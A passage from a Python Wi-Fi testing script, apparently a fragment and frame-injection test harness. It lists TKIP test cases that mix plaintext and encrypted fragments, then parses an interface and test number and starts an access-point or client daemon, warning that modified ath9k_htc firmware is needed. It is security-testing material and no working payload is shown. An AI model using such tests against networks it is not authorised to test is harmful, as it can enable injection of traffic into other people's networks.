	#   1.4 [TKIP] Encrpted, Encrypted, no global MIC
	#   1.5 Plaintext, plaintext
	#   1.6 Encrypted, plaintext
	#   1.7 Plaintext, encrypted
	#   1.8 Encrypted, plaintext, encrypted
	#   1.9 Plaintext, encrypted, plaintext
	#   2. Test 2 but first plaintext sent before installing key

	return test

if __name__ == "__main__":
	log(WARNING, "Remember to use a modified backports and ath9k_htc firmware!\n")
	if "--help" in sys.argv or "-h" in sys.argv:
		print("\nSee README.md for usage instructions.")
		quit(1)
	elif len(sys.argv) < 2:
		print(f"Usage: {sys.argv[0]} interface test_id")
		quit(1)

	options = TestOptions()
	options.interface = sys.argv[1]
	options.test = prepare_tests(int(sys.argv[2]))

	# Parse remaining options
	start_ap = argv_pop_argument("--ap")
	while argv_pop_argument("--debug"):
		libwifi.global_log_level -= 1

	# Now start the tests
	if start_ap:
		daemon = Authenticator(options)
	else:
		daemon = Supplicant(options)
	atexit.register(cleanup)
	daemon.run()
